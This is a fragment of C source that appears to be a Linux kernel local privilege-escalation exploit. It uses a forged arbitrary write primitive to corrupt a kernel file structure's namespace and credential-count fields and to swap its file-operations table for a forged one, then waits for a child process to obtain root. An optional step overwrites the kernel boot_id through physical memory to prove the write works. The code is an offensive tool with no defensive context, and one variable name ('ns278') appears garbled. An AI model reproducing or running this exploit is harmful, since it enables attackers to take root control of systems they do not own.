    uintptr_t ns = data_addr(INIT_USER_NS);
    uintptr_t uc = data_addr(INIT_UCOUNTS);
    if (!rwf_write64(filp_F + 0x88, ns278))
      pr_error("filp-physroot: fixup +%02zx failed\n", (size_t)0x88);
    pr_info("filp-physroot: fixup +%02zx written\n", (size_t)0x88);
    if (!rwf_write64(filp_F + 0x90, ns))
      pr_error("filp-physroot: fixup +%02zx failed\n", (size_t)0x90);
    pr_info("filp-physroot: fixup +%02zx written\n", (size_t)0x90);
    if (!rwf_write64(filp_F + 0x98, uc))
      pr_error("filp-physroot: fixup +%02zx failed\n", (size_t)0x98);
    pr_info("filp-physroot: fixup +%02zx written\n", (size_t)0x98);
    pr_info("filp-physroot: f_op write table=%016zx -> file+0x10=%016zx\n",
            fake_fops, filp_F + 0x10);
    if (!rwf_write64(filp_F + 0x10, fake_fops))
      pr_error("filp-physroot: f_op write failed\n");
    pr_success("filp-physroot: f_op written (4 forged ops total)\n");
    int st = 0;
    waitpid(filp_spinner, &st, 0);
    pr_info("filp-physroot: spinner child exited status=%d\n", st);
    if ((st & 0xff7f) == 0)
      return 0;
    pr_error("filp-physroot: spinner child did not root\n");
  }

  if (getenv("GL_RWF_BOOTID_PROOF")) {
    /* prove the channel: overwrite random_table.boot_id.data with the proof
     * pattern via a forged slot, then read /proc/.../boot_id back */
    static const unsigned char proof[16] = "RWF-WRITE-PROOF!";
    static const char hexproof[] = "5257462d-5752-4954-452d-50524f4f4621";
    if (!rwf_phys_write(data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE), proof, 16))
      pr_error("bootid proof write failed\n");
    pr_info("bootid proof written via forged slot\n");
    char buf[64] = {0};
    int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
    if (bfd >= 0) {
      read(bfd, buf, 63);
      close(bfd);
    }
    pr_info("boot_id after forged write: %s", buf);
    if (!strncmp(buf, hexproof, 36)) {
      pr_success("RWF WRITE PROOF LANDED\n");
      return 0;
    }
    pr_error("RWF WRITE PROOF MISS (boot_id unchanged)\n");
  }

  rwforge_root_and_capture();
  return 0;
}
